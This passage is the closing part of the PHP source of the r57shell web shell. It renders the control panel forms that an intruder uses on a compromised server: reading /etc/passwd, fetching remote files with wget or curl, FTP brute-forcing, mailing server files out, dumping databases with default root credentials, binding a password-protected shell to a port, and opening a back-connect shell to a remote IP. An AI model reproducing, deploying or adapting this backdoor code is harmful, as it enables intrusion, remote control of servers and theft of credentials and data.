echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if(@ini_get('file_uploads')){
echo "&lt;form name=upload method=POST ENCTYPE=multipart/form-data&gt;";
echo $table_up1.$lang[$language.'_text5'].up_down('id14').$table_up2.div('id14').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text6'].$arrow."&lt;/b&gt;",in('file','userfile',85,''));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text21'].$arrow."&lt;/b&gt;",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if(!$safe_mode&&!$windows){
echo $fs.$table_up1.$lang[$language.'_text15'].up_down('id15').$table_up2.div('id15').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text16'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"with\"&gt;&lt;option value=\"wget\"&gt;wget&lt;/option&gt;&lt;option value=\"fetch\"&gt;fetch&lt;/option&gt;&lt;option value=\"lynx\"&gt;lynx&lt;/option&gt;&lt;option value=\"links\"&gt;links&lt;/option&gt;&lt;option value=\"curl\"&gt;curl&lt;/option&gt;&lt;option value=\"GET\"&gt;GET&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir).ws(2)."&lt;b&gt;".$lang[$language.'_text17'].$arrow."&lt;/b&gt;".in('text','rem_file',78,'http://'));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text86'].up_down('id16').$table_up2.div('id16').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text59'].$arrow."&lt;/b&gt;",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
$arh = $lang[$language.'_text92'];
if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
echo sr(15,"&lt;b&gt;".$lang[$language.'_text91'].$arrow."&lt;/b&gt;",in('radio','compress',0,'none').' '.$arh);
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
if(@function_exists("ftp_connect")){
echo $table_up1.$lang[$language.'_text93'].up_down('id17').$table_up2.div('id17').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text87']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(25,"&lt;b&gt;".$lang[$language.'_text88'].$arrow."&lt;/b&gt;",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text89'].$arrow."&lt;/b&gt;",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',45,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text90'].$arrow."&lt;/b&gt;","&lt;select name=ftp_mode&gt;&lt;option&gt;FTP_BINARY&lt;/option&gt;&lt;option&gt;FTP_ASCII&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt14']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text100']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(25,"&lt;b&gt;".$lang[$language.'_text88'].$arrow."&lt;/b&gt;",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',45,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text89'].$arrow."&lt;/b&gt;",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text90'].$arrow."&lt;/b&gt;","&lt;select name=ftp_mode&gt;&lt;option&gt;FTP_BINARY&lt;/option&gt;&lt;option&gt;FTP_ASCII&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt2']));
echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
}
if($unix && @function_exists("ftp_connect")){
echo $fs.$table_up1.$lang[$language.'_text94'].up_down('id18').$table_up2.div('id18').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text88'].$arrow."&lt;/b&gt;",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo sr(15,"","&lt;font face=Verdana size=-2&gt;".$lang[$language.'_text99']." ( &lt;a href=".$_SERVER['PHP_SELF']."?users&gt;".$lang[$language.'_text95']."&lt;/a&gt; )&lt;/font&gt;");
echo sr(15,"",in('checkbox','reverse id=reverse',0,'1').$lang[$language.'_text101']);
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if(@function_exists("mail")){
echo $table_up1.$lang[$language.'_text102'].up_down('id19').$table_up2.div('id19').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text103']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(25,"&lt;b&gt;".$lang[$language.'_text105'].$arrow."&lt;/b&gt;",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("piero@kralpalace.org"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text106'].$arrow."&lt;/b&gt;",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text107'].$arrow."&lt;/b&gt;",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text108'].$arrow."&lt;/b&gt;",'&lt;textarea name=text cols=33 rows=2&gt;'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'&lt;/textarea&gt;');
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text104']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(25,"&lt;b&gt;".$lang[$language.'_text105'].$arrow."&lt;/b&gt;",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("piero@kralpalace.org"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text106'].$arrow."&lt;/b&gt;",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text107'].$arrow."&lt;/b&gt;",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from r57shell"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',45,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text91'].$arrow."&lt;/b&gt;",in('radio','compress',0,'none').' '.$arh);
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
}
if($mysql_on||$mssql_on||$pg_on||$ora_on)
{
$select = '&lt;select name=db&gt;';
if($mysql_on) $select .= '&lt;option&gt;MySQL&lt;/option&gt;';
if($mssql_on) $select .= '&lt;option&gt;MSSQL&lt;/option&gt;';
if($pg_on)    $select .= '&lt;option&gt;PostgreSQL&lt;/option&gt;';
if($ora_on)   $select .= '&lt;option&gt;Oracle&lt;/option&gt;';
$select .= '&lt;/select&gt;';
echo $table_up1.$lang[$language.'_text82'].up_down('id20').$table_up2.div('id20').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text40']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(35,"&lt;b&gt;".$lang[$language.'_text80'].$arrow."&lt;/b&gt;",$select);
echo sr(35,"&lt;b&gt;".$lang[$language.'_text111'].$arrow."&lt;/b&gt;",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text36'].$arrow."&lt;/b&gt;",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' &lt;b&gt;.&lt;/b&gt; '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."&lt;b&gt;".$lang[$language.'_text41'].$arrow."&lt;/b&gt;",in('checkbox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt9']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text83']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(35,"&lt;b&gt;".$lang[$language.'_text80'].$arrow."&lt;/b&gt;",$select);
echo sr(35,"&lt;b&gt;".$lang[$language.'_text111'].$arrow."&lt;/b&gt;",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text39'].$arrow."&lt;/b&gt;",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text84'].$arrow."&lt;/b&gt;".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
echo $te."&lt;div align=center id='n'&gt;&lt;textarea cols=55 rows=1 name=db_query&gt;".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES; SELECT * FROM user; SELECT version(); select user();"))."&lt;/textarea&gt;&lt;br&gt;".in('submit','submit',0,$lang[$language.'_butt1'])."&lt;/div&gt;&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
}
if(!$safe_mode&&!$windows){
echo $table_up1.$lang[$language.'_text81'].up_down('id21').$table_up2.div('id21').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=34%&gt;".$ts;
echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text9']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text10'].$arrow."&lt;/b&gt;",in('text','port',15,'11457'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text11'].$arrow."&lt;/b&gt;",in('text','bind_pass',15,'r57'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;Perl&lt;/option&gt;&lt;option value=\"C\"&gt;C&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=33%&gt;".$ts;
echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text12']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text13'].$arrow."&lt;/b&gt;",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;",in('text','port',15,'11457'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;Perl&lt;/option&gt;&lt;option value=\"C\"&gt;C&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=33%&gt;".$ts;
echo "&lt;font face=Verdana size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text22']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text23'].$arrow."&lt;/b&gt;",in('text','local_port',15,'11457'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text24'].$arrow."&lt;/b&gt;",in('text','remote_host',15,'irc.dalnet.ru'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text25'].$arrow."&lt;/b&gt;",in('text','remote_port',15,'6667'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text26'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;datapipe.pl&lt;/option&gt;&lt;option value=\"C\"&gt;datapipe.c&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
}
echo '&lt;/table&gt;'.$table_up3."&lt;/div&gt;&lt;/div&gt;&lt;div align=center id='n'&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;o---[ r57.gen.tr v1.3- Thesaboarqe : R57&lt;a href=http://www.r57.gen.tr/&gt;www.r57.gen.tr/&lt;/a&gt; | version ".$version." ]---o&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;".$f;
?&gt;
</pre>